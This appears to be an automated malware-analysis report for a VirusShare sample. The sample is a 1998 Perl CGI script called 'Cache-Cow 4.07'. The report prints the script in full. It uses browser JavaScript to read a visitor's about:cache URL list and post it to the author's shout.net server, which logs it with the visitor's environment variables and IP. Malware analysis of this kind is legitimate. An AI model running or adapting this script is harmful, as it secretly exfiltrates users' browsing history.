{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "open": "May open a file"
        },
        "macro": "#!/usr/bin/perl\n#\n# cache-cow-4.07.cgi -- Dan Brumleve <nothing@shout.net>, 1998.10.05\n\nuse CGI qw(escape unescape);\n\nmy $self = \"http://www.shout.net/nothing/son-of-cache-cow/cache-cow-4.07.cgi\";\n\nmy $cgi = new CGI;\nmy $action = $cgi->param(\"action\");\n\nif (!$action) {\n  print \"Content-type: text/html\\n\\n\" . <<\"  EOF\";\n  <html>\n  <head><title>Cache-Cow 4.07</title></head>\n  <body bgcolor=#ffffff>\n  <h1>Cache-Cow 4.07</h1>\n  <form action=\"$self\" method=\"post\">\n  <input type=hidden name=action value=launch>\n  <input type=submit value=\"Give Dan Your Cache\">\n  </form>\n  </body>\n  </html>\n  EOF\n  exit 0;\n}\n\nif ($action eq \"launch\") {\n  my $q = escape($cgi->param(\"q\"));\n  print \"Content-type: text/html\\n\\n\" . <<\"  EOF\";\n  <title>Cache-Cow 4.07 (activated)</title>\n  <script>\n  var slave;\n  var data = \"\";\n\n  function report() {\n    slave.location=\"$self?action=yum\";\n  }\n\n  function lump() {\n    slave.onload = report;\n  }\n\n  function launch() {\n    slave = window.open(\"javascript:void(0)\", \"slave\");\n    document.f.submit();\n    slave.onunload=lump;\n  }\n\n  function show() {\n    document.g.urls.value = data;\n    document.g.submit();\n  }\n\n  </script>\n  <body onLoad=\"launch()\" onUnload=\"show()\">\n\n  <base href=\"about:\">\n\n  <form action=\"cache\" method=\"post\" name=f target=slave>\n  <input type=submit></form>\n  <form action=\"$self\" method=\"post\" name=g>\n  <input type=hidden name=action value=show>\n  <input type=hidden name=urls value=\"\">\n  <input type=submit>\n  </form>\n  </body>\n  EOF\n\n  exit 0;\n}\n\nif ($action eq \"yum\") {\n  print \"Content-type: application/x-javascript\\n\\n\" . <<\"  EOF\";\n  var s = \"\";\n  for (i = 0; i < document.links.length; i++) {\n    s += escape(document.links[i].href) + \"&\";\n  }\n  window.opener.data = s;\n  window.opener.location = \"javascript:1\";\n  window.close();\n  EOF\n  exit 0;\n}\n\nif ($action eq \"show\") {\n  my $urls = join(\"\\n\", map {\n   $_ = unescape($_); s/^about://; $_ } split(/&/,$cgi->param(\"urls\")));\n  if (open(FP, \">> logs/log-$ENV{REMOTE_ADDR}.txt\")) {\n    for (sort keys %ENV) { print FP $_ . \"=\" . $ENV{$_} . \"\\n\"; }\n    print FP \"\\n\" . $urls . \"\\n\\n\";\n    close(FP);\n  }\n  print \"Content-type: text/plain\\n\\n\" . <<\"  EOF\";\nHere are the URLs retrieved from your browser:\n\n$urls\n  EOF\n\n  exit 0;\n}"
    },
    "filename": "VirusShare_3552cc34d5356d76984e2272f06c5a0a",
    "filesize": 2346,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "3552cc34d5356d76984e2272f06c5a0a",
        "sha1": "d044383e4e851834fcbcadcb4bb4f444327b8a59",
        "sha256": "8efc15e6d8d3c02707ab52512a30b462a8f00ffade2369523994217178c11ed7"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "# cache-cow-4.07.cgi -- Dan Brumleve <nothing@shout.net>, 1998.10.05",
            "use CGI qw(escape unescape);",
            "my $self = \"http://www.shout.net/nothing/son-of-cache-cow/cache-cow-4.07.cgi\";",
            "my $cgi = new CGI;",
            "my $action = $cgi->param(\"action\");",
            "if (!$action) {",
            "  print \"Content-type: text/html\\n\\n\" . <<\"  EOF\";",
            "  <html>",
            "  <head><title>Cache-Cow 4.07</title></head>",
            "  <body bgcolor=#ffffff>",
            "  <h1>Cache-Cow 4.07</h1>",
            "  <form action=\"$self\" method=\"post\">",
            "  <input type=hidden name=action value=launch>",
            "  <input type=submit value=\"Give Dan Your Cache\">",
            "  </form>",
            "  </body>",
            "  </html>",
            "  EOF",
            "  exit 0;",
            "if ($action eq \"launch\") {",
            "  my $q = escape($cgi->param(\"q\"));",
            "  print \"Content-type: text/html\\n\\n\" . <<\"  EOF\";",
            "  <title>Cache-Cow 4.07 (activated)</title>",
            "  <script>",
            "  var slave;",
            "  var data = \"\";",
            "  function report() {",
            "    slave.location=\"$self?action=yum\";",
            "  function lump() {",
            "    slave.onload = report;",
            "  function launch() {",
            "    slave = window.open(\"javascript:void(0)\", \"slave\");",
            "    document.f.submit();",
            "    slave.onunload=lump;",
            "  function show() {",
            "    document.g.urls.value = data;",
            "    document.g.submit();",
            "  </script>",
            "  <body onLoad=\"launch()\" onUnload=\"show()\">",
            "  <base href=\"about:\">",
            "  <form action=\"cache\" method=\"post\" name=f target=slave>",
            "  <input type=submit></form>",
            "  <form action=\"$self\" method=\"post\" name=g>",
            "  <input type=hidden name=action value=show>",
            "  <input type=hidden name=urls value=\"\">",
            "  <input type=submit>",
            "  </form>",
            "  </body>",
            "  EOF",
            "  exit 0;",
            "if ($action eq \"yum\") {",
            "  print \"Content-type: application/x-javascript\\n\\n\" . <<\"  EOF\";",
            "  var s = \"\";",
            "  for (i = 0; i < document.links.length; i++) {",
            "    s += escape(document.links[i].href) + \"&\";",
            "  window.opener.data = s;",
            "  window.opener.location = \"javascript:1\";",
            "  window.close();",
            "  EOF",
            "  exit 0;",
            "if ($action eq \"show\") {",
            "  my $urls = join(\"\\n\", map {",
            "   $_ = unescape($_); s/^about://; $_ } split(/&/,$cgi->param(\"urls\")));",
            "  if (open(FP, \">> logs/log-$ENV{REMOTE_ADDR}.txt\")) {",
            "    for (sort keys %ENV) { print FP $_ . \"=\" . $ENV{$_} . \"\\n\"; }",
            "    print FP \"\\n\" . $urls . \"\\n\\n\";",
            "    close(FP);",
            "  print \"Content-type: text/plain\\n\\n\" . <<\"  EOF\";",
            "Here are the URLs retrieved from your browser:",
            "$urls",
            "  EOF",
            "  exit 0;"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.shout.net/nothing/son-of-cache-cow/cache-cow-4.07.cgi"
        ]
    },
    "time": "0:00:00.309949",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
